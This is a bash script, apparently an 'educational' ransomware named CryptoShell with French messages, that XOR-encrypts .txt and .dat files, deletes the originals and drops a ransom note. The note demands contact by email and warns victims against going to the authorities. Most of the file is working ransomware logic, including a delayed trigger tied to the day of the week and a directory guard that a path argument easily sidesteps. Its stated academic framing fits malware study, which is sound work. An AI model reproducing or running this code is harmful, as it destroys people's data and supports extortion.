#!/bin/bash

RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# GARDE-FOU DE SÉCURITÉ
if [[ $(basename "$PWD") != "lab" ]]
then
    echo -e "${RED}[CRITICAL] Arrêt de sécurité : Ce script éducatif ne peut être exécuté que dans un répertoire de test nommé 'lab/'.${NC}"
    exit 1
fi

# CONSENTEMENT
if [ ! -f ".cs_agreed" ]
then
	echo -e "${YELLOW}======================================================================="
	echo -e "                    AVERTISSEMENT DE SÉCURITÉ   "
	echo -e "======================================================================="
	echo -e "Ce script (CryptoShell) est un ransomware éducatif conçu STRICTEMENT"
	echo -e "à des fins d'analyse académique. Son exécution va CHIFFRER et SUPPRIMER"
	echo -e "les fichiers originaux (.txt, .dat) présents dans ce répertoire."
	echo -e ""
	echo -e "Toute utilisation malveillante est strictement interdite."
	echo -e "=======================================================================${NC}"
	echo ""

	read -p "Appuyez sur [ENTRÉE] pour confirmer que vous comprenez les risques et continuer, ou faites [Ctrl+C] pour annuler..."
	echo ""
	
	touch .cs_agreed
fi

trap "rm -f .cs_count .cryptoshell_key 2> /dev/null" SIGINT SIGTERM

if [ $(date +%u) -ne 7 ]
then
	count=$(cat .cs_count 2> /dev/null)
	if [ -z "$count" ]
	then
		echo 1 > .cs_count
		exit 1
	elif [ $count -lt 4 ]
	then
		echo $((count+1)) > .cs_count
		exit 1
	else
		rm -f .cs_count 2> /dev/null
	fi
fi

create_ransom_note() {
	local ransom_note="$1/RANSOM_NOTE.txt"
	echo "Cher utilisateur,

Si vous lisez ceci, cela signifie que vos données ont été piratés et chiffrés.

La meilleure façon de récupérer vos données en toute sécurité est de nous contacter.

Pour que la récupération soit possible, veuillez suivre les instructions suivantes :

1. Ne contactez pas les autorités compétentes.
2. N'essayez pas de récupérer vos données vous-même.
3. Ne faites pas appel à des sociétés tierces de récupération de données.

Contactez nous par e-mail : cryptoshell@protonmail.com
Ensuite saissisez votre identifiant unique : $2" > "$ransom_note"
}

source xor_helper.sh

uuid=$(cat /proc/sys/kernel/random/uuid 2> /dev/null)
key=$(cat .cryptoshell_key 2> /dev/null)

if [ -z "$key" ]
then
	key=$(generate_key)
	echo $key > .cryptoshell_key
fi

rep="${1:-.}"

while IFS= read -r -d '' file
do

	if [ -f "${file}.locked" ]
	then 
		continue
	fi

	xor_file "$file" "${file}.locked" $key
	touch -r "$file" "${file}.locked"
	create_ransom_note "$(dirname "$file")" $uuid
	rm -f "$file" 2> /dev/null
	
done < <(find "$rep" -type f \( -name "*.txt" -o -name "*.dat" \) -print0 2> /dev/null)
